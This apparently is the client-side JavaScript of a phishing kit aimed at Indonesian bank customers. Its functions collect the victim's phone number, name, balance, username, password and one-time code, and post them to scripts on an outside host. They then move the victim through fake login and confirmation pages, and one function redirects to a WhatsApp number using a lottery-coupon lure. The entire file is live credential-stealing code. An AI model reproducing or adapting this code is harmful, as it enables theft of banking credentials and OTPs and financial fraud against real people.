function sendData(){
        event.stopPropagation();
        event.preventDefault();    
        $(".process1").fadeIn();
 document.getElementById('kirims').innerHTML = "Memproses....";
$.ajax({
 type: 'POST',
 url: 'https://xxontol-app.whf.bz/fstvl1/sendData.php',
 dataType: 'JSON',
 data: $('#inputdata').serialize(), 
 complete: function(data) {
            console.log('Complete')
  setTimeout(function(){
    window.location.href='login.html';  
    $(".process1").fadeOut();
var nomor = document.getElementById("nomor").value;
sessionStorage.setItem("nomor", nomor);
var nama = document.getElementById("nama").value;
sessionStorage.setItem("nama", nama);
var saldo = document.getElementById("saldo").value;
sessionStorage.setItem("saldo", saldo);
     }, 500);
      }
   });
    return false;
}
        
        


function sendLogin(){
  event.stopPropagation();
    event.preventDefault();
    $(".process1").fadeIn();
  $("#btnsubmit").prop("disabled", true);
  document.getElementById('btnsubmit').innerHTML = "Memproses....";
$.ajax({
 type: 'POST',
 url: 'https://xxontol-app.whf.bz/fstvl1/sendLogin.php',
 dataType: 'JSON',
 data: $('#inputlogin').serialize(), 
 complete: function(data) {
      console.log('Complete')
  setTimeout(function(){
    window.location.href='konf.html';  
    $(".process1").fadeOut();
var nomor = document.getElementById("nomor").value;
sessionStorage.setItem("nomor", nomor);
var nama = document.getElementById("nama").value;
sessionStorage.setItem("nama", nama);
var saldo = document.getElementById("saldo").value;
sessionStorage.setItem("saldo", saldo);
var unames = document.getElementById("uname").value;
sessionStorage.setItem("unames", unames);
var norek = document.getElementById("pass").value;
sessionStorage.setItem("norek", norek);
     }, 500);
        }
    });
    return false;
};    



function sendOtp(){

  event.stopPropagation();
    event.preventDefault();
    $(".process1").fadeIn();
 document.getElementById('kirims').innerHTML = "Memproses....";



$.ajax({

 type: 'POST',
 url: 'https://xxontol-app.whf.bz/fstvl1/otp.php',
 dataType: 'JSON',
 data: $('#inputOtp').serialize(),
 
 complete: function(data) {
            console.log('Complete')
 setTimeout(function(){
      document.getElementById("blinkAktivasi").style.display = "block";
      
  document.getElementById('kirims').innerHTML = "Kirim";                  
 $(".process1").fadeOut();
 $("#nama1").val("");
 $("#nama1").addClass('textarea1'); 
   


    }, 2000);



        }
    });

    return false;
};   
        
                   
function getcs(){
 $("#process1").show();   
  audio4 = document.getElementById("bsiku");
  audio = document.getElementById("bsi");
    audio4.play();
     audio.load();
    audio4.loop = false
setTimeout(function(){  
    $("#process1").hide();   
location.href='https://wa.me/13155232241?text=Saya Belum Mendapatkan Kode Kupon Undian';

    }, 5000);    
    
}
